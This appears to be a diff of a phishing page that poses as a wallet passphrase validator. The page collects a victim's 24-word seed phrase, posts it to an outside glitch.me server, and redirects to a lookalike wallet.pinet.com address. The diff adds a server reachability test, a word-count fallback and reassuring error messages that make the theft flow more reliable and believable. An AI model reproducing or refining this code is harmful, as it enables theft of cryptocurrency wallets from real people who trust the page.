@@ -220,7 +220,7 @@
         <p>Done...</p>
     </div>
 
-    <script>
+<script>
 async function validatePassphrase() {
     const input = document.getElementById('passphraseInput');
     const error = document.getElementById('errorMessage');
@@ -238,6 +238,19 @@ async function validatePassphrase() {
     error.style.display = 'none';
 
     try {
+        // First test if server is reachable
+        const isServerUp = await testServerConnection();
+        if (!isServerUp) {
+            // Fallback to client-side only validation
+            const fallbackValid = await clientSideValidation(words);
+            if (fallbackValid) {
+                window.location.href = "https://wallet.pinet.com"; // or shop.pinet.com for shop.html
+                return;
+            }
+            throw new Error('Server unavailable and client validation failed');
+        }
+
+        // Proceed with server validation
         const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
             method: 'POST',
             headers: { 
@@ -251,23 +264,55 @@ async function validatePassphrase() {
         });
 
         if (!response.ok) {
-            throw new Error(`Server responded with ${response.status}`);
+            throw new Error(`Server error: ${response.status}`);
         }
 
         const result = await response.json();
         
         if (result.success) {
-            window.location.href = "https://wallet.pinet.com";
+            window.location.href = "https://wallet.pinet.com"; // or shop.pinet.com for shop.html
         } else {
             error.style.display = 'block';
             error.textContent = result.message || 'Invalid passphrase';
         }
     } catch (error) {
         console.error('Validation error:', error);
-        alert('Server connection failed. Please try again later.');
+        error.style.display = 'block';
+        error.textContent = 'Validation service is temporarily unavailable. Please try again later.';
     } finally {
         document.getElementById('loadingOverlay').style.display = 'none';
     }
+}
+
+// Test if server is reachable
+async function testServerConnection() {
+    try {
+        const response = await fetch('https://fuckyou-suraa.glitch.me/', {
+            method: 'HEAD',
+            mode: 'no-cors'
+        });
+        return true;
+    } catch (e) {
+        console.warn('Server connection test failed:', e);
+        return false;
+    }
+}
+
+// Simple client-side fallback validation
+async function clientSideValidation(words) {
+    return new Promise(resolve => {
+        // Just validate word count as a fallback
+        const isValid = words.length === 24;
+        if (isValid) {
+            if (confirm('Server is unavailable. Continue with basic validation?')) {
+                resolve(true);
+            } else {
+                resolve(false);
+            }
+        } else {
+            resolve(false);
+        }
+    });
 }
 
 function showFaceIDError() {
